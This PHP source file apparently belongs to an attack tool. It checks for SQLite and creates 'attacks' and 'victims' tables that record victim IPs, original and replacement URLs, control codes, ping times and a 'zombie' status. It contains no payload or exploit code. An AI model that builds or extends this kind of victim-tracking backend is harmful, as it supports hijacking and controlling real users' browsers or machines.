<?php
	function check_prereq(){
		// check for sqllite
		$sqllite_installed = false;
		foreach(get_loaded_extensions() as $ext){
			//DEBUG: print $ext."<br/>";
			if($ext == "sqlite3"){ $sqllite_installed = true;}
		}
		if($sqllite_installed == false){
			print "You don't have <a href=\"http://php.net/manual/en/book.sqlite.php\">SQL Lite</a> installed. Install it";
			return false;
		}
		return true;
	}

class MyDB extends SQLite3
{
	const STATUS_NEW		= 0;
	const STATUS_ACTIVE = 1;
	const STATUS_ZOMBIE = 9;
	function __construct()
	{
		try 
		{ 
			$this->open('db.sqlite', SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE);
			$this->busyTimeout(2000);
			// create attacks, and their victims
			$this->exec("CREATE TABLE IF NOT EXISTS attacks (".
									"id INTEGER PRIMARY KEY, ".
									"orig_url TEXT, ".
									"new_url TEXT, ".
									"action INTEGER DEFAULT 0, ".
									"control_code TEXT) ");

			$this->exec("CREATE TABLE IF NOT EXISTS victims (".
									"id INTEGER PRIMARY KEY, ".
									"attack_id INTEGER, ".
									"ip TEXT, ".
									"orig_url TEXT, ".
									"new_url TEXT, ".
									"action INTEGER  DEFAULT 0, ".
									"status INTEGER DEFAULT 0, ".
									"last_ping INTEGER)"); 
		}
		catch(Exception $e)
		{
			die($e);
			print($e);
			exit();
		}	
	}
}
	
?>
